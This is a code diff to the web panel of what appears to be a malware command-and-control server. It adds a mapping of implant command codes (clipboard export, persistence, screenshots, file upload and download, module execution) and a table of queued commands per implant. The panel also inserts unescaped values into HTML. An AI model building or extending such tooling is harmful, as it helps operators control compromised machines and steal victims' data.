@@ -72,6 +72,27 @@ function order_response_by_time ( response ){
     return ordered_list
 }
 
+function convert_type_to_command(type){
+
+   try {
+   mapping = {
+    "CM":"Direct execution",
+    "FD":":: download_file",
+    "EP":":: enable_persistence",
+    "EC":":: export_clipboard",
+    "ML":":: list_module",
+    "IM":":: exec_module",
+    "LM":":: load_module",
+    "PS":":: play_audio",
+    "SC":":: screenshot",
+    "SI":":: sys_info",
+    "UF":":: upload_file"
+    }
+    return mapping[type]
+    } catch {
+    return "Error."
+    }
+}
 
 async function get_active_implant_command_queue (cid){
     $.ajax({
@@ -82,9 +103,9 @@ async function get_active_implant_command_queue (cid){
             document.getElementById('await_commands_tbl').innerHTML = ""
             for (element in response){
                 if (response[element].read_by_implant == 0){
-                 n1 = "Implant: "+response[element].uik
-                 n2 = "Cmd: "+ response[element].log_entry.type
-                 n3 = "Arg: "+response[element].log_entry.args
+                 n1 = "Implant ID: <pre style='display:inline'>"+response[element].uik+"</pre>"
+                 n2 = "Cmd: <pre style='display:inline'>"+ convert_type_to_command(response[element].log_entry.type)+"</pre>"
+                 n3 = "Arg: <pre style='display:inline'>"+response[element].log_entry.args+"</pre>"
                     table_element = "<tr><td class=\"p-2\"><span>"+ n1 + "<br>"+n2+"<br>"+n3+"</span></td></tr>"
                     $('#await_commands_tbl')
                     .append(table_element)
